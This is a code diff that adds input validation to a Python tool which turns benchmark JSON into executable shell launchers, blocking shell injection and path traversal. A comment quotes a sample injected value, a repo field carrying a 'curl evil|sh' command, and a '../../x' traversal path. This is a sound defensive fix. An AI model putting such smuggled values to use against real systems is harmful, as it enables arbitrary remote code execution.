@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import argparse
 import json
+import re
 import stat
 import subprocess  # noqa: S404 # nosec: B404
 import sys
@@ -34,6 +35,48 @@ from .state import (
 # Acceptance thresholds — below these the model is too slow to be useful
 _PROMPT_TOK_S_MIN = 20.0
 _DECODE_TOK_S_MIN = 5.0
+
+# Every field below is interpolated verbatim into a generated shell script that is
+# then made executable, and `family` also forms a filesystem path. A benchmark JSON
+# is an input file, so it is a trust boundary: without these, repo="x; curl evil|sh #"
+# yields a launcher that runs arbitrary commands, and family="../../x" writes the
+# launcher outside LAUNCHERS_DIR. write_accepted()'s own family check runs too late —
+# by then the launcher exists and is chmod +x.
+_SAFE_SIMPLE = re.compile(r"^[A-Za-z0-9_.-]+$")
+_SAFE_REPO = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$")
+_SAFE_NUM_LIST = re.compile(r"^[0-9]+(,[0-9]+)*$")
+_SAFE_BACKENDS = frozenset({"rocm", "vulkan", "cuda", "rocmfp4"})
+_SAFE_SPLIT_MODES = frozenset({"layer", "row", "tensor", "none"})
+
+
+def _validate_accept_fields(fields: dict[str, str]) -> list[str]:
+    """Return a list of rejection messages for anything unsafe to interpolate."""
+    checks = {
+        "family": _SAFE_SIMPLE,
+        "alias": _SAFE_SIMPLE,
+        "profile": _SAFE_SIMPLE,
+        "repo": _SAFE_REPO,
+        "visible_devices": _SAFE_NUM_LIST,
+        "tensor_split": _SAFE_NUM_LIST,
+    }
+    errors = []
+    for name, pattern in checks.items():
+        value = fields[name]
+        if not pattern.match(value) or ".." in value:
+            errors.append(f"benchmark JSON field contains an unsafe {name}: {value!r}")
+    # Optional fields: empty is fine, anything present must still be simple.
+    for name in ("hf_file", "quant"):
+        value = fields[name]
+        if value and (not _SAFE_SIMPLE.match(value) or ".." in value):
+            errors.append(f"benchmark JSON field contains an unsafe {name}: {value!r}")
+    if fields["backend"] not in _SAFE_BACKENDS:
+        errors.append(f"benchmark JSON field contains an unsafe backend: {fields['backend']!r}")
+    if fields["split_mode"] not in _SAFE_SPLIT_MODES:
+        errors.append(
+            f"benchmark JSON field contains an unsafe split_mode: {fields['split_mode']!r}"
+        )
+    return errors
+
 
 # awk filter applied to llama-server log output in launchers
 _AWK_LOG_FILTER = (
@@ -237,7 +280,7 @@ def accept_model(benchmark_file: str, host: str) -> dict:
     }
 
 
-def cmd_install(args: argparse.Namespace) -> int:
+def cmd_install(args: argparse.Namespace) -> int:  # noqa: C901
     """Install a model: pick candidate → download → benchmark → ask user → accept/reject.
 
     Requires `search` to have been run first (saves candidates).
@@ -318,7 +361,7 @@ def _ensure_hf_cli(host: str) -> bool:
                 SSH_BIN,
                 *SSH_OPTS,
                 host,
-                'export PATH="$HOME/.local/bin:$PATH" && (which hf || pip3 install --quiet --break-system-packages huggingface_hub) && which hf',
+                'export PATH="$HOME/.local/bin:$PATH" && (which hf || pip3 install --quiet --break-system-packages huggingface_hub) && which hf',  # noqa: E501
             ],
             capture_output=True,
             text=True,
@@ -369,7 +412,7 @@ def _download_on_host(host: str, repo: str, hf_file: str) -> bool:
             SSH_BIN,
             *SSH_OPTS,
             host,
-            "sudo /usr/bin/bash -c 'chmod 1777 /home/cass/.cache/huggingface/hub/.locks' 2>/dev/null; "
+            "sudo /usr/bin/bash -c 'chmod 1777 /home/cass/.cache/huggingface/hub/.locks' 2>/dev/null; "  # noqa: E501
             "find ~/.cache/huggingface/hub/.locks -type f -delete 2>/dev/null; "
             "find ~/.cache/huggingface/hub/.locks -type d -empty -delete 2>/dev/null; "
             "true",
@@ -429,7 +472,7 @@ def _run_benchmark(
 
     print(f"  running: {' '.join(bench_cmd[:8])}...")
     try:
-        result = subprocess.run(
+        result = subprocess.run(  # noqa: S603 # nosec: B603
             bench_cmd,
             capture_output=True,
             text=True,
@@ -477,7 +520,7 @@ def _deploy_accepted_to_remote(host: str) -> bool:
     deploy_cmd = [str(MODEL_MANAGER), "deploy", "--target", f"remote:{host}", "--yes"]
     print(f"deploying launchers to {host}...")
     try:
-        result = subprocess.run(
+        result = subprocess.run(  # noqa: S603 # nosec: B603
             deploy_cmd,
             capture_output=True,
             text=True,
@@ -556,7 +599,7 @@ def cmd_accept(args: argparse.Namespace) -> int:
 # ---- Helpers ----
 
 
-def _do_accept(bench_path: Path) -> bool:
+def _do_accept(bench_path: Path) -> bool:  # noqa: C901
     """Core accept logic: validate benchmark JSON, generate launcher, write metadata."""
     if not bench_path.exists() or not bench_path.is_file():
         print(f"benchmark file not found: {bench_path}", file=sys.stderr)
@@ -612,6 +655,25 @@ def _do_accept(bench_path: Path) -> bool:
     visible_devices = str(data.get("visible_devices") or "0,1")
     split_mode = str(data.get("split_mode") or "layer")
     tensor_split = str(data.get("tensor_split") or "1,1")
+
+    errors = _validate_accept_fields(
+        {
+            "family": family,
+            "alias": alias,
+            "profile": profile_name,
+            "repo": repo,
+            "hf_file": hf_file,
+            "quant": quant,
+            "backend": backend,
+            "visible_devices": visible_devices,
+            "split_mode": split_mode,
+            "tensor_split": tensor_split,
+        }
+    )
+    if errors:
+        for msg in errors:
+            print(msg, file=sys.stderr)
+        return False
 
     # All modern accepted models support reasoning/thinking mode; oc-local defaults to True
     reasoning = True
